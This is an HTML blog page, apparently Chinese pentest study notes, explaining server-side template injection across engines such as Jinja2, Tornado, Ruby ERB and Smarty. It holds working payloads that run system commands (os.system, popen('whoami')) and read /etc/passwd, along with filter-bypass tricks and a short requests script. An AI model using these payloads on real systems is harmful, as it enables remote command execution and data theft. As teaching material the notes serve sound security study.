@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="模版注入简介模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。 测试方法 确定使用的引擎 查看引擎相关的文档，确定其安全机制以及自带">
+<meta property="og:type" content="article">
+<meta property="og:title" content="模板注入">
+<meta property="og:url" content="http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="frozenfish">
+<meta property="og:description" content="模版注入简介模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。 测试方法 确定使用的引擎 查看引擎相关的文档，确定其安全机制以及自带">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-12-25T18:01:50.000Z">
+<meta property="article:modified_time" content="2023-12-27T13:46:03.938Z">
+<meta property="article:author" content="frozenfish">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>模板注入</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/12/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/12/26/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&text=模板注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&is_video=false&description=模板注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=模板注入&body=Check out this article: http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&name=模板注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&t=模板注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">模版注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B"><span class="toc-number">1.3.</span> <span class="toc-text">测试用例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-number">1.4.</span> <span class="toc-text">目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%B1%9E%E6%80%A7"><span class="toc-number">1.5.</span> <span class="toc-text">相关属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class"><span class="toc-number">1.5.1.</span> <span class="toc-text">__class__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mro"><span class="toc-number">1.5.2.</span> <span class="toc-text">__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-number">1.5.3.</span> <span class="toc-text">__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-number">1.5.4.</span> <span class="toc-text">__subclasses__()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.</span> <span class="toc-text">绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.6.1.</span> <span class="toc-text">字符串拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.2.</span> <span class="toc-text">使用参数绕过</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        模板注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">frozenfish</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-25T18:01:50.000Z" class="dt-published" itemprop="datePublished">2023-12-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p>
+<h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><ul>
+<li>确定使用的引擎</li>
+<li>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</li>
+<li>需找攻击面，尝试攻击</li>
+</ul>
+<h2 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h2><ul>
+<li><p>简单的数学表达式，<code>&#123;&#123; 7+7 &#125;&#125; =&gt; 14</code></p>
+</li>
+<li><p>字符串表达式 <code>&#123;&#123; "ajin" &#125;&#125; =&gt; ajin</code></p>
+</li>
+<li><ul>
+<li><p>Ruby</p>
+<p><code>&lt;%= 7 * 7 %&gt;``&lt;%= File.open(&#39;/etc/passwd&#39;).read %&gt;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Java</p>
+<p><code>$&#123;7*7&#125;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Twig</p>
+<p><code>&#123;&#123;7*7&#125;&#125;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Smarty</p>
+<p><code>&#123;php&#125;echo </code>id<code>;&#123;/php&#125;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>AngularJS</p>
+<p><code>$eval(&#39;1+1&#39;)</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Tornado</p>
+<p>引用模块 <code>&#123;% import module %&#125;</code>&#x3D;&gt; <code>&#123;% import os %&#125;&#123;&#123; os.popen("whoami").read() &#125;&#125;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Flask&#x2F;Jinja2</p>
+<p><code>&#123;&#123; config &#125;&#125;``&#123;&#123; config.items() &#125;&#125;``&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125;``&#123;&#123;''.__class__.__mro__[-1].__subclasses__()&#125;&#125;``&#123;&#123; url_for.__globals__['__builtins__'].__import__('os').system('ls') &#125;&#125;``&#123;&#123; request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() &#125;&#125;</code></p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><p>Django</p>
+<p><code>&#123;&#123; request &#125;&#125;``&#123;% debug %&#125;``&#123;% load module %&#125;``&#123;% include "x.html" %&#125;``&#123;% extends "x.html" %&#125;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul>
+<li>创建对象</li>
+<li>文件读写</li>
+<li>远程文件包含</li>
+<li>信息泄漏</li>
+<li>提权</li>
+</ul>
+<h2 id="相关属性"><a href="#相关属性" class="headerlink" title="相关属性"></a>相关属性</h2><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><p>python中的新式类（即显示继承object对象的类）都有一个属性 <code>__class__</code> 用于获取当前实例对应的类，例如 <code>&quot;&quot;.__class__</code> 就可以获取到字符串实例对应的类</p>
+<h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><p>python中类对象的 <code>__mro__</code> 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。</p>
+<h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><p>保存了函数所有的所有全局变量，在利用中，可以使用 <code>__init__</code> 获取对象的函数，并通过 <code>__globals__</code> 获取 <code>file</code> <code>os</code> 等模块以进行下一步的利用</p>
+<h3 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h3><p>python的新式类都保留了它所有的子类的引用，<code>__subclasses__()</code> 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</p>
+<p>因为python中的类都是继承object的，所以只要调用object类对象的 <code>__subclasses__()</code> 方法就可以获取想要的类的对象。</p>
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><pre><code>request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60]
+</code></pre>
+<h3 id="使用参数绕过"><a href="#使用参数绕过" class="headerlink" title="使用参数绕过"></a>使用参数绕过</h3><pre><code>params = &#123;
+    &#39;clas&#39;: &#39;__class__&#39;,
+    &#39;mr&#39;: &#39;__mro__&#39;,
+    &#39;subc&#39;: &#39;__subclasses__&#39;
+&#125;
+data = &#123;
+    &quot;data&quot;: &quot;&#123;&#123;''[request.args.clas][request.args.mr][1][request.args.subc]()&#125;&#125;&quot;
+&#125;
+r = requests.post(url, params=params, data=data)
+print(r.text)
+</code></pre>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">模版注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">测试方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B"><span class="toc-number">1.3.</span> <span class="toc-text">测试用例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87"><span class="toc-number">1.4.</span> <span class="toc-text">目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%B1%9E%E6%80%A7"><span class="toc-number">1.5.</span> <span class="toc-text">相关属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class"><span class="toc-number">1.5.1.</span> <span class="toc-text">__class__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mro"><span class="toc-number">1.5.2.</span> <span class="toc-text">__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#globals"><span class="toc-number">1.5.3.</span> <span class="toc-text">__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subclasses"><span class="toc-number">1.5.4.</span> <span class="toc-text">__subclasses__()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.</span> <span class="toc-text">绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.6.1.</span> <span class="toc-text">字符串拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.2.</span> <span class="toc-text">使用参数绕过</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&text=模板注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&is_video=false&description=模板注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=模板注入&body=Check out this article: http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&title=模板注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&name=模板注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/12/26/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/&t=模板注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    frozenfish
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
